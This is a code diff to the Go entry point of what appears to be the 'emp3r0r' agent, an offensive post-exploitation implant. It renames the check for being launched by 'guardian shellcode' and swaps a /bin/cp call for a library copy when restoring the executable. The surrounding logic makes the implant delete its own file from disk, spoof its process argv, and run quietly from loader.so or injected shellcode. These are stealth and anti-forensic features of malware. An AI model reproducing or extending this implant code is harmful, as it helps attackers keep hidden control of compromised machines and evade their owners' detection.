@@ -40,21 +40,19 @@ func main() {
 
 	// check if this process is invoked by guardian shellcode
 	// by checking if process executable is same as parent's
-	run_from_shellcode := util.ProcExePath(os.Getpid()) == util.ProcExePath(os.Getppid())
-	if run_from_shellcode {
-		log.Printf("emp3r0r %d is invoked by shellcode in %d", os.Getpid(), os.Getppid())
-		os.Setenv("LD", "true") // it's the same thing, i don't want another env var
-
+	run_from_guardian_shellcode := util.ProcExePath(os.Getpid()) ==
+		util.ProcExePath(os.Getppid())
+	if run_from_guardian_shellcode {
+		log.Printf("emp3r0r %d is invoked by shellcode in %d",
+			os.Getpid(), os.Getppid())
 	}
 
 	// accept env vars
 	verbose := os.Getenv("VERBOSE") == "true"
 	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
-
 	// run as elvish shell
 	runElvsh := os.Getenv("ELVSH") == "TRUE"
-	// do not self delete
-	// also do not rename process since we might be invokded by loader.so
+	// self delete or not
 	persistent := os.Getenv("PERSISTENCE") == "true"
 	// are we running from loader.so?
 	run_from_loader := os.Getenv("LD") == "true"
@@ -72,7 +70,7 @@ func main() {
 	}
 
 	// do not tamper with argv or re-launch under these conditions
-	do_not_touch_argv := runElvsh || run_from_loader || run_from_shellcode
+	do_not_touch_argv := runElvsh || run_from_loader || run_from_guardian_shellcode
 
 	// rename to make room for argv spoofing
 	if len(util.FileBaseName(os.Args[0])) < 30 &&
@@ -150,7 +148,7 @@ func main() {
 	}
 
 	// self delete
-	if !persistent && !run_from_shellcode {
+	if !persistent && !run_from_guardian_shellcode {
 		err = os.Remove(self_path)
 		if err != nil {
 			log.Printf("Error removing agent file from disk: %v", err)
@@ -163,14 +161,15 @@ func main() {
 		log.Fatalf("ApplyRuntimeConfig: %v", err)
 	}
 
-	if run_from_shellcode {
+	if run_from_guardian_shellcode {
 		// restore original executable file
-		out, err := exec.Command("/bin/cp", "-f",
+		err = util.Copy(
 			fmt.Sprintf("%s/%s",
-				agent.RuntimeConfig.AgentRoot, util.FileBaseName(util.ProcExePath(os.Getpid()))),
-			util.ProcExePath(os.Getpid())).CombinedOutput()
+				agent.RuntimeConfig.AgentRoot,
+				util.FileBaseName(util.ProcExePath(os.Getpid()))),
+			util.ProcExePath(os.Getpid()))
 		if err != nil {
-			log.Printf("failed to restore original executable: %s (%v)", out, err)
+			log.Printf("failed to restore original executable: %v", err)
 		}
 	}
 
